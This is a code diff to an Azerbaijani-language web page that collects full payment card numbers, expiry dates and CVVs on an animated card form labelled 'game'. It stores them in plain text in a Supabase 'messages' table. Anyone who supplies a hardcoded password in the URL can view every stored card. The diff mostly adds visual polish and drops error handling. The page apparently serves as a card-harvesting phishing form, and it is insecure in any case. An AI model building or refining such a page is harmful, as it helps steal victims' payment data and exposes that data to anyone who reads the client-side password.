@@ -9,7 +9,7 @@
 body {
   margin: 0;
   font-family: Arial, sans-serif;
-  background: linear-gradient(135deg, #003366, #001a33);
+  background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
   display: flex;
   justify-content: center;
   align-items: center;
@@ -22,24 +22,61 @@ body {
   max-width: 400px;
 }
 
-.card-design {
-  background: linear-gradient(135deg, #0052cc, #003d99);
+.card {
+  width: 100%;
+  height: 200px;
+  perspective: 1000px;
+  margin-bottom: 20px;
+}
+
+.card-inner {
+  width: 100%;
+  height: 100%;
+  position: relative;
+  transition: transform 0.6s;
+  transform-style: preserve-3d;
+}
+
+.card.flipped .card-inner {
+  transform: rotateY(180deg);
+}
+
+.card-front, .card-back {
+  position: absolute;
+  width: 100%;
+  height: 100%;
   border-radius: 20px;
   padding: 20px;
-  margin-bottom: 20px;
-  box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+  box-sizing: border-box;
+  backface-visibility: hidden;
+}
+
+.card-front {
+  background: linear-gradient(135deg, #0052cc, #003d99);
+}
+
+.card-back {
+  background: linear-gradient(135deg, #001f3f, #001a33);
+  transform: rotateY(180deg);
 }
 
 .card-number {
+  margin-top: 60px;
   font-size: 18px;
   letter-spacing: 2px;
-  margin-bottom: 15px;
 }
 
-.card-bottom {
+.card-info {
   display: flex;
   justify-content: space-between;
+  margin-top: 20px;
   font-size: 14px;
+}
+
+.cvv-box {
+  margin-top: 60px;
+  text-align: right;
+  font-size: 18px;
 }
 
 input {
@@ -56,7 +93,7 @@ button {
   padding: 12px;
   border-radius: 10px;
   border: none;
-  background: #00b894;
+  background: #00c6ff;
   color: white;
   font-weight: bold;
   cursor: pointer;
@@ -68,20 +105,34 @@ button {
 
 <div class="container">
 
-<div class="card-design">
-  <div class="card-number">**** **** **** ****</div>
-  <div class="card-bottom">
-    <span>MMYY</span>
-    <span>CVV</span>
+<div class="card" id="card">
+  <div class="card-inner">
+
+    <div class="card-front">
+      <div class="card-number" id="displayNumber">**** **** **** ****</div>
+      <div class="card-info">
+        <span id="displayExpiry">MM/YY</span>
+        <span>OYUN</span>
+      </div>
+    </div>
+
+    <div class="card-back">
+      <div class="cvv-box">
+        CVV: <span id="displayCVV">***</span>
+      </div>
+    </div>
+
   </div>
 </div>
 
-<input type="text" id="cardNumber" placeholder="Kartın 16 rəqəmi" maxlength="16">
-<input type="text" id="expiry" placeholder="Bitmə tarixi (4 rəqəm)" maxlength="4">
-<input type="text" id="cvv" placeholder="CVV (3 rəqəm)" maxlength="3">
+<input type="text" id="cardNumber" placeholder="16 rəqəm"
+maxlength="19">
+<input type="text" id="expiry" placeholder="MMYY"
+maxlength="4">
+<input type="text" id="cvv" placeholder="3 rəqəm"
+maxlength="3">
 
 <button onclick="submitCard()">Göndər</button>
-
 <p id="status"></p>
 
 </div>
@@ -95,32 +146,62 @@ const supabase = createClient(supabaseUrl, supabaseKey);
 
 const adminPassword = "service.2000";
 
-window.submitCard = async function() {
+const card = document.getElementById("card");
 
-  const cardNumber = document.getElementById("cardNumber").value;
-  const expiry = document.getElementById("expiry").value;
-  const cvv = document.getElementById("cvv").value;
+const numberInput = document.getElementById("cardNumber");
+const expiryInput = document.getElementById("expiry");
+const cvvInput = document.getElementById("cvv");
+
+numberInput.addEventListener("input", () => {
+  let value = numberInput.value.replace(/\D/g, "").substring(0,16);
+  value = value.replace(/(.{4})/g, "$1 ").trim();
+  document.getElementById("displayNumber").innerText =
+    value || "**** **** **** ****";
+});
+
+expiryInput.addEventListener("input", () => {
+  let value = expiryInput.value.replace(/\D/g, "").substring(0,4);
+  if (value.length >= 3) {
+    value = value.substring(0,2) + "/" + value.substring(2);
+  }
+  document.getElementById("displayExpiry").innerText =
+    value || "MM/YY";
+});
+
+cvvInput.addEventListener("focus", () => {
+  card.classList.add("flipped");
+});
+
+cvvInput.addEventListener("blur", () => {
+  card.classList.remove("flipped");
+});
+
+cvvInput.addEventListener("input", () => {
+  let value = cvvInput.value.replace(/\D/g, "").substring(0,3);
+  document.getElementById("displayCVV").innerText =
+    value || "***";
+});
+
+window.submitCard = async function() {
+  const cardNumber = numberInput.value.replace(/\s/g,"");
+  const expiry = expiryInput.value;
+  const cvv = cvvInput.value;
 
   if (cardNumber.length !== 16 || expiry.length !== 4 || cvv.length !== 3) {
-    document.getElementById("status").innerText = "Məlumatları düzgün daxil edin!";
+    document.getElementById("status").innerText =
+      "Məlumatları düzgün daxil edin!";
     return;
   }
 
-  const { error } = await supabase
-    .from("messages")
-    .insert([{ 
-      name: cardNumber,
-      message: "Expiry: " + expiry + " | CVV: " + cvv 
-    }]);
+  await supabase.from("messages").insert([{
+    name: cardNumber,
+    message: "Expiry: " + expiry + " | CVV: " + cvv
+  }]);
 
-  if (error) {
-    document.getElementById("status").innerText = "Xəta baş verdi";
-  } else {
-    document.getElementById("status").innerText = "Kart əlavə edildi!";
-  }
+  document.getElementById("status").innerText = "Kart əlavə edildi!";
 };
 
-// Admin baxışı
+// Admin
 const urlParams = new URLSearchParams(window.location.search);
 if (urlParams.get("kod") === adminPassword) {
   loadCards();
@@ -133,10 +214,11 @@ async function loadCards() {
     .order("id", { ascending: false });
 
   const container = document.createElement("div");
+  container.style.marginTop = "20px";
 
   data.forEach(card => {
     const div = document.createElement("div");
-    div.style.background = "#00264d";
+    div.style.background = "#001a33";
     div.style.padding = "10px";
     div.style.marginTop = "10px";
     div.style.borderRadius = "10px";
